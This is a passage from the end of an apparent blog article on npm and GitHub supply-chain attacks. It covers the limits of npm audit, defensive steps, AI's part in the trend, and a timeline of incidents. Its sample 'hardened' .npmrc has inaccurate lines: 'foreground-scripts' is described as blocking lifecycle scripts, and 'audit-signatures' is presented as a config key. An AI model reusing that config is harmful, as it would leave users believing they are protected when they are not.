+    <p><code>npm audit</code> checks against a known vulnerability database. The Axios backdoor was not in any vulnerability database during the 39 minutes it was live. The chalk compromise was not in any database during the two hours it was live. These are zero-day supply chain attacks. By definition, <code>npm audit</code> cannot catch them because the advisory does not exist yet when you need it most.</p>
+
+    <h3>Pinned versions</h3>
+    <p>Pinning exact versions (e.g., "axios": "1.13.7" instead of "^1.13.7") protects you from pulling in a new malicious version automatically. But the TanStack attack published malicious code under existing version tags. And if a compromised package is a <em>transitive</em> dependency - meaning it is pulled in by something else in your tree - your pinning only covers your direct dependencies, not the entire tree.</p>
+
+    <div class="pull-quote">
+      <p>"The attacker does not need to beat your security tools. They just need to publish their code during the gap between when the malicious version goes live and when the advisory gets filed. That gap is their entire operating window - and it has been enough every single time."</p>
+    </div>
+  </section>
+
+  <!-- 10. WHAT YOU CAN ACTUALLY DO -->
+  <section>
+    <div class="section-num">10 &middot; Practical Defence</div>
+    <h2>What You Can Actually Do About This (No, Seriously)</h2>
+    <p>I am not going to pretend there is a silver bullet here. But there are concrete steps that would have meaningfully reduced exposure to every attack discussed in this article.</p>
+
+    <ol class="styled">
+      <li><span><strong>Disable postinstall scripts by default.</strong> Add <code>ignore-scripts=true</code> to your .npmrc file. Yes, this will break some packages that genuinely need postinstall hooks (like esbuild or sharp, which download platform-specific binaries). Whitelist those explicitly. But the default should be "do not run arbitrary code during install."</span></li>
+      <li><span><strong>Use a package proxy or private registry.</strong> Tools like Verdaccio, Artifactory, or npm Enterprise let you cache packages and add a review gate before new versions enter your organisation's dependency tree. This would have given you a buffer during the Axios window.</span></li>
+      <li><span><strong>Enable npm provenance checks.</strong> Run <code>npm audit signatures</code> regularly. Packages published through verified CI pipelines with SLSA provenance are meaningfully harder to tamper with - though the TanStack attack shows this is not foolproof if the CI itself is compromised.</span></li>
+      <li><span><strong>Pin your GitHub Actions to commit SHAs, not tags.</strong> The tj-actions attack worked because the attacker retagged existing version tags. If you reference an action by its full commit SHA, retagging cannot affect you.</span></li>
+      <li><span><strong>Use Socket, Snyk, or similar runtime analysis tools.</strong> Unlike <code>npm audit</code>, these tools analyse package behaviour - network calls, filesystem access, environment variable reads - and can flag suspicious activity even before an advisory is published.</span></li>
+      <li><span><strong>Audit your CI/CD pipeline permissions.</strong> The TanStack attack exploited overly broad CI permissions. Follow the principle of least privilege. Your build pipeline should not have publish access to npm unless it is actively publishing.</span></li>
+    </ol>
+
+    <div class="code-block">
+      <div class="code-label">.npmrc - A hardened configuration</div>
+      <pre><span class="code-cmt"># Disable postinstall scripts by default</span>
+<span class="code-var">ignore-scripts</span>=<span class="code-num">true</span>
+
+<span class="code-cmt"># Require package-lock.json to be in sync</span>
+<span class="code-var">package-lock</span>=<span class="code-num">true</span>
+
+<span class="code-cmt"># Prevent npm from resolving to a different registry</span>
+<span class="code-var">registry</span>=<span class="code-str">https://registry.npmjs.org/</span>
+
+<span class="code-cmt"># Verify package signatures</span>
+<span class="code-var">audit-signatures</span>=<span class="code-num">true</span>
+
+<span class="code-cmt"># Do not automatically run lifecycle scripts of dependencies</span>
+<span class="code-var">foreground-scripts</span>=<span class="code-num">true</span></pre>
+    </div>
+
+    <div class="highlight-box">
+      <strong>For GitHub Actions specifically</strong>
+      Always pin actions to full commit SHAs. Instead of <code>uses: actions/checkout@v4</code>, use <code>uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11</code>. Yes, it is ugly. Yes, it is harder to maintain. But it is the only way to ensure that a retagging attack cannot inject malicious code into your CI pipeline.
+    </div>
+  </section>
+
+  <!-- 11. THE BIGGER PICTURE -->
+  <section>
+    <div class="section-num">11 &middot; The Bigger Picture</div>
+    <h2>This Is Not a Bug. It Is the Logical Consequence of How We Built the Ecosystem.</h2>
+    <p>Here is what I keep coming back to: none of this is surprising if you think about the incentive structures at play.</p>
+    <p>npm has <strong>9.8 trillion package downloads annually</strong> across its registry. Over <strong>99% of all known open source malware exists on npm</strong>. The registry hosts over 2 million packages, maintained by hundreds of thousands of individual developers - most of them unpaid volunteers who maintain their packages in their spare time.</p>
+    <p>These maintainers are the single-point-of-failure for the entire modern web. When a single phishing email can compromise chalk and debug - packages that sit in the dependency tree of essentially every Node.js application ever written - the system's security posture is not determined by how good your company's security practices are. It is determined by how resistant a random open source maintainer is to a well-crafted phishing email on a Tuesday evening.</p>
+    <p>And the attackers have noticed. The Sonatype 2026 State of the Software Supply Chain Report documents <strong>454,600+ new malicious packages</strong> identified throughout 2025 alone, a 75% year-over-year increase. Over 800 packages were attributed to the Lazarus Group alone. Supply chain attacks doubled in 2025, with global losses reaching $60 billion.</p>
+    <p>The attacks are evolving too. Early supply chain attacks were mostly typosquatting - publishing "axois" and hoping someone mistyped. Now we are seeing credential theft, CI pipeline hijacking, self-replicating worms, dormant "sleeper" dependencies that activate under specific conditions, and even "dead man's switch" mechanisms that threaten data destruction if exfiltration channels are severed. This is not amateur hour. This is industrialised warfare against developer infrastructure.</p>
+
+    <div class="callout">
+      <div class="callout-label">The xz utils lesson nobody learned</div>
+      <p>Remember the xz utils backdoor from March 2024? A social engineering campaign spanning years, where an attacker slowly gained maintainer trust to insert a backdoor into a compression library used by virtually every Linux distribution? The response at the time was shock, hand-wringing, and promises to "do better." Eighteen months later, Debian Docker images on Docker Hub were <em>still</em> shipping with the backdoored version. The polyfill.io domain, compromised over two years ago, is still redirecting traffic. We are not learning from these incidents. We are just waiting for the next one.</p>
+    </div>
+  </section>
+
+  <!-- 12. AI ANGLE -->
+  <section>
+    <div class="section-num">12 &middot; The AI Accelerant</div>
+    <h2>AI Tools Are Both the Cause and the Target</h2>
+    <p>There is an angle to this crisis that nobody is connecting explicitly enough: AI is woven through almost every incident in this story - as a cause, as a target, and as a force multiplier for attackers.</p>
+
+    <h3>AI broke GitHub</h3>
+    <p>GitHub's own CTO admitted it. The surge in incidents is directly tied to <strong>agentic AI workflows</strong> - Copilot completions, AI-powered code review bots, autonomous agents spinning up CI runs, and tools like Cursor and Windsurf that interact with GitHub APIs at machine speed rather than human speed. GitHub Copilot itself had 44 outages in the past year, 10 of them in February 2026 alone. The AI features Microsoft is aggressively shipping are consuming the very infrastructure they run on. When your most profitable feature is also your biggest reliability risk, you have a problem no amount of 30X scaling will cleanly solve.</p>
+
+    <h3>AI infrastructure is a prime target</h3>
+    <p>Notice what the attackers are going after. LiteLLM - a Python package for calling LLM APIs - was compromised to steal API keys and cloud credentials. The mistralai PyPI package was backdoored. The QUIETVAULT credential stealer discovered in 2026 specifically scans for <strong>AI CLI tools and harvests developer tokens</strong> for services like OpenAI, Anthropic, and Hugging Face. Attackers know that AI API keys are valuable - they provide access to expensive compute, and the billing often runs uncapped. A stolen OpenAI API key can rack up thousands of dollars in charges before anyone notices.</p>
+
+    <h3>AI makes supply chain attacks easier to execute</h3>
+    <p>This is the part that worries me most. The same LLMs that help developers write code also help attackers write convincing phishing emails, generate plausible-looking package names, create typosquatting variants at scale, and craft obfuscated payloads. The Shai-Hulud worm's ability to propagate across hundreds of packages autonomously is the kind of automation that AI makes dramatically easier to build. We are in an arms race where the attackers have access to the same tools we do - and they are using them to industrialise supply chain attacks at a pace that manual security review cannot match.</p>
+
+    <div class="highlight-box">
+      <strong>The irony in one sentence</strong>
+      We are using AI tools to write code faster, those tools are breaking the platforms we deploy on, the packages we depend on are being targeted specifically because they power AI workflows, and the attacks themselves are being automated with AI. It is a feedback loop, and it is tightening.
+    </div>
+  </section>
+
+  <!-- 13. CONCLUSION -->
+  <section>
+    <div class="section-num">13 &middot; Where This Leaves Us</div>
+    <h2>The Infrastructure We Depend on Is Nobody's Responsibility</h2>
+    <p>I wrote this article because I genuinely believe most developers do not understand how fragile the ground beneath them has become. We treat npm, GitHub, PyPI, and Docker Hub as utilities - always there, always safe, always working. The last twelve months have demonstrated, with increasing urgency, that none of those assumptions hold.</p>
+    <p>GitHub cannot stay up. npm packages are being weaponised by nation-state actors. Self-replicating worms are spreading through the registry. VS Code extensions are delivering RATs. Docker images are leaking production credentials. CI pipelines are being hijacked. And the response from the ecosystem has been - what, exactly? A few blog posts. Some advisories. An npm audit command that cannot catch anything in real time.</p>
+    <p>The problem is structural. The entire modern software supply chain runs through package registries that were designed for convenience, not security. They were built in an era when the threat model was "someone publishes a broken package" rather than "a state-sponsored hacking group systematically compromises maintainer accounts to deploy RATs at scale."</p>
+    <p>I do not have a neat conclusion for you. I do not think one exists yet. But I think the first step is acknowledging the scale of the problem - not as isolated incidents that each get their own news cycle and then fade, but as a <strong>continuous, accelerating crisis in developer infrastructure security</strong> that affects every single person who writes code for a living.</p>
+    <p>The next time GitHub goes down or an npm advisory lands in your inbox, do not sigh and wait it out. Pay attention. Because the gap between "annoying" and "catastrophic" is getting smaller every week.</p>
+
+    <div class="ornament">&middot; &middot; &middot;</div>
+
+    <div class="callout">
+      <div class="callout-label">Timeline of Key Incidents Referenced</div>
+      <p><span class="tag red">Mar 2025</span> tj-actions/changed-files compromised (23K repos affected)</p>
+      <p><span class="tag red">Sep 2025</span> chalk/debug/ansi-styles phished (2B+ weekly downloads)</p>
+      <p><span class="tag red">Sep 2025</span> Shai-Hulud worm Wave 1 (500+ packages)</p>
+      <p><span class="tag">Nov 2025</span> GitHub expired TLS cert outage</p>
+      <p><span class="tag red">Nov 2025</span> Shai-Hulud Wave 2 (25K+ malicious repos)</p>
+      <p><span class="tag">Feb 2026</span> GitHub: 37 incidents in one month</p>
+      <p><span class="tag red">Mar 2026</span> Trivy vulnerability scanner compromised by TeamPCP</p>
+      <p><span class="tag red">Mar 2026</span> Axios backdoored by North Korean state actor</p>
+      <p><span class="tag red">Apr 2026</span> GitHub Merge Queue silently deleting code</p>
+      <p><span class="tag red">Apr 2026</span> Shai-Hulud Wave 3 + Mini Wave 4 (SAP packages)</p>
+      <p><span class="tag red">May 2026</span> TanStack namespace hijacked (84 artifacts in 6 minutes)</p>
+    </div>
+  </section>
+
+  <div class="footnote">
+    All incident dates, CVE numbers, and statistics referenced in this article are sourced from official GitHub availability reports, CISA advisories, Sonatype's 2026 State of the Software Supply Chain Report, Socket.dev disclosures, Microsoft Threat Intelligence reports, Huntress research, and Snyk/Wiz security advisories. Attack code reconstructions are simplified for illustration and do not represent the exact malicious payloads.
+  </div>
+
+</div><!-- /content-wrap -->
+</body>
+</html>
